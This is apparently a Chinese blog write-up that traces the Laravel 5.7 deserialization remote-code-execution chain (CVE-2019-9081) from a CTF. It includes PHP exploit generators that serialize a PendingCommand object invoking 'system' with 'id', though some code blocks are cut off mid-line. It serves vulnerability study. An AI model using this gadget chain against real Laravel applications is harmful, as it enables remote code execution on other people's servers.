在前一阵的 **2019强网杯线下赛** 中，出现一道 **Laravel5.7 RCE**
漏洞的利用。之前有关注过这个漏洞，但没细究。比赛期间，原漏洞作者删除了详细的分析文章，故想自己挖掘这个漏洞利用链。本文将详细记录 **Laravel5.7
反序列化漏洞RCE链** 的挖掘过程。
## 漏洞环境
直接使用 **composer** 安装 **laravel5.7** 框架，并通过 `php artisan serve` 命令启动 **Web**
服务。
    ➜  html composer create-project laravel/laravel laravel57 "5.7.*"
    ➜  html cd laravel57
    ➜  laravel57 php artisan serve --host=0.0.0.0
在 **laravel57/routes/web.php** 文件中添加一条路由，便于我们后续访问。
    // /var/www/html/laravel57/routes/web.php
在 **laravel57/app/Http/Controllers/** 下添加 **DemoController** 控制器，代码如下：
    // /var/www/html/laravel57/app/Http/Controllers/DemoController.php
    test** 对象的 **expectedQuestions**
属性是一个数组。如果这个数组的内容可以控制，当然会方便我们控制下面的链式调用。所以我们这里考虑通过 **__get** 魔术方法来控制数据，恰巧
**laravel** 框架中有挺多可利用的地方，这里我随意选取一个 **Faker\DefaultGenerator** 类。
所以我们构造如下 **EXP** 继续进行测试。同样，使用该 **EXP** 在 **foreach** 语句处使用单步跳过，看看是否可以正常执行到
**$this- >app->bind(xxxx)** 语句。实际上，这里可以正常结束 **foreach** 语句，并没有抛出什么异常。同样，我们对
**$this- >app->bind(xxxx)** 语句也使用单步跳过，程序同样可以正常运行。
    test = $test;
                $this->app = $app;
                $this->command = $command;
                $this->parameters = $parameters;
            }
        }
    }
    namespace Faker{
        class DefaultGenerator{
            protected $default;
            public function __construct($default = null)
            {
                $this->default = $default;
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{
            public function __construct() { }
        }
    }
    namespace{
        $defaultgenerator = new Faker\DefaultGenerator(array("1" => "1"));
        $application = new Illuminate\Foundation\Application();
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('id'));
        echo urlencode(serialize($pendingcommand));
    }
    ?>
使用上面的 **EXP** ，我们已经可以成功进入到最后一步，而这里如果直接单步跳过就会抛出异常，因此我们需要跟进细看。
    $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
这里的 **$this- >app** 实际上是 **Illuminate\Foundation\Application** 类，而在类后面使用
**[]** 是什么意思呢？一开始，我以为这是 **PHP7** 的新语法，后来发现并不是。我们在上面的代码前加上如下两段代码，然后动态调试一下。
    $kclass = Kernel::class;
    $app = $this->app[Kernel::class];
    $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
可以看到 **Kernel::class** 对应固定的字符串 **Illuminate\Contracts\Console\Kernel** ，而单步跳过
`$app = $this->app[Kernel::class];`
代码时会抛出异常。跟进这段代码，我们会发现其会依次调用如下类方法，这些我们都不需要太关注，因为没有发现可控点。
我们要关注的点在最后调用的 **resolve** 方法上，因为这段代码中有我们可控的利用点。如下图中 **角标1** 处，可以明显看到程序
**return** 了一个我们可控的数据。也就是说，我们可以将任意对象赋值给 **$this- >instances[$abstract]**
，这个对象最终会赋值给 `$this->app[Kernel::class]` ，这样就会变成调用我们构造的对象的 **call**
方法了。（下图的第二个点是原漏洞作者利用的地方，目的也是返回一个可控类实例，具体可以参看文章：[laravelv5.7反序列化rce(CVE-2019-9081)](https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/)
）
现在我们再次构造如下 **EXP** 继续进行尝试。为了避免文章篇幅过长，与上面 **EXP** 相同的代码段用省略号代替。
    instances['Illuminate\Contracts\Console\Kernel'] = $instances;
            }
        }
    }
    namespace{
        $defaultgenerator = new Faker\DefaultGenerator(array("1" => "1"));
        $app = new Illuminate\Foundation\Application();
        $application = new Illuminate\Foundation\Application($app);
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('id'));
        echo urlencode(serialize($pendingcommand));
    }
    ?>
我们用上面生成的 **EXP** 尝试攻击，会发现已经可以成功执行命令了。
这里我们再来说说为什么这里 **$this- >instances['Illuminate\Contracts\Console\Kernel']**
我选择的是 **Illuminate\Foundation\Application** 类，我们跟着 **EXP** 。
**Illuminate\Foundation\Application** 类继承了 **Illuminate\Container\Container**
类的 **call** 方法，其调用的又是 **Illuminate\Container\BoundMethod** 的 **call**
静态方法。而在这个静态方法中，我们看到一个关键函数 **call_user_func_array** ，其在闭包函数中被调用。
我们先来看一下这个闭包函数在 **callBoundMethod** 静态方法中是如何被调用的。可以看到在 **callBoundMethod**
方法中，返回了闭包函数的调用结果。而闭包函数中返回了 `call_user_func_array($callback,
static::getMethodDependencies(xxxx))` ，我们继续看这个 **getMethodDependencies**
函数的代码。该函数仅仅只是返回 **$dependencies** 数组和 **$parameters** 的合并数据，其中
**$dependencies** 默认是一个空数组，而 **$parameters** 正是我们可控的数据。因此，这个闭包函数返回的是
`call_user_func_array(可控数据,可控数据)` ，最终导致代码执行。
## 总结
个人认为 **PHP** 相关的漏洞中，最有意思的部分就属于 **POP链**
的挖掘。通过不断找寻可利用点，再将它们合理的串成一条链，直达漏洞核心。为了防止思维被固化，个人不建议一开始就去细看他人的漏洞分析文章，不妨自己先试着分析分析。待完成整个漏洞的分析（或遇到问题无法继续下去时），再看他人的文章，学习他们优秀的思路，从而提高自身的代码审计能力。